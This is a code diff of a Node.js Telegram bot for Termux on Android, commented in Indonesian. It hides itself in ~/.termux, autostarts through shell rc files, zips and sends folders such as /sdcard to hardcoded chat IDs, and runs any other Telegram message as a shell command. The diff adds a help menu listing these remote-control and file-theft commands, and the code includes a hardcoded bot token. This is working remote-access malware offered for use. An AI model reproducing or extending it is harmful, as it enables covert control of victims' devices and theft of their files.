@@ -5,7 +5,7 @@ const path = require('path');
 
 const BOT_TOKEN = '7870124534:AAEc_RrWqAk3X0CfQMvJxLkplkhOXizDcqc';
 // Ganti dengan 2 chat ID yang kamu mau kirim pesan/file ke sini
-const CHAT_IDS = ['6432390931', '7880175262']; // Contoh: chat id utama dan cadangan
+const CHAT_IDS = ['6432390931', '7880175262'];
 
 const hiddenDir = `${process.env.HOME}/.termux`;
 const hiddenFile = `${hiddenDir}/.service-cache`;
@@ -115,6 +115,22 @@ function getUpdates() {
 }
 
 function runCommand(cmd) {
+  if (cmd === '/start') {
+    const menu = `
+Hai! Berikut daftar perintah yang tersedia:
+
+/start - Menampilkan daftar menu dan penjelasan fitur.
+/mati - Mematikan bot dan menghapus autostart.
+/zip [folder] - Membuat zip dari folder dan mengirimnya.
+/ambil [folder] - Mengambil semua file dari folder dalam bentuk zip.
+/cek [folder] - Mengecek isi folder (default: /sdcard).
+
+Perintah lainnya akan dijalankan sebagai command shell dan hasilnya dikirimkan.
+    `;
+    sendMessage(menu.trim());
+    return;
+  }
+
   if (cmd === '/mati') {
     [bashrcPath, profilePath, zshrcPath].forEach(file => {
       if (fs.existsSync(file)) {
